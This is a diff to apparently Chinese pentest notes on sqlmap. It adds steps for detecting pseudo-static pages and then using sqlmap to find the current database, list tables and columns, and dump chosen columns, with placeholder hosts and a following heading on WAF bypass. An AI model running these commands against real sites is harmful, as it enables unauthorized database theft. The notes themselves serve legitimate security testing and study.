@@ -1142,7 +1142,23 @@ python sqlmap.py -u "注入点" --level 2 --referer
 url后面加*(星号)
 
 ```python
--u "http://host/index/*"
+1.分析是否为伪静态
+www.xxx.com/xxx.html
+控制台：document.lastModified
+按上下箭头 看时间是否改变 如果改变就是伪静态
+
+2.--current-db
+sqlmap.py -u www.xxx.com/xxx.html --current-db
+在SQLmap中 哪里存在注入点就在哪里输入
+
+3.-D "数据库名" --tables
+sqlmap.py -u www.xxx.com/xxx*.html -D 数据库 --tables
+
+4.-D "数据库名" -T "表名" --columns
+sqlmap.py -u www.xxx.com/xxx*.html -D 数据库 -T 表名 --columns
+
+5.-D "数据库名" -T "表名" -C "列名" --dump
+sqlmap.py -u www.xxx.com/xxx*.html -D 数据库 -T 表名 -C 列1,列2 --dump
 ```
 
 ### SQLMap绕过WAF
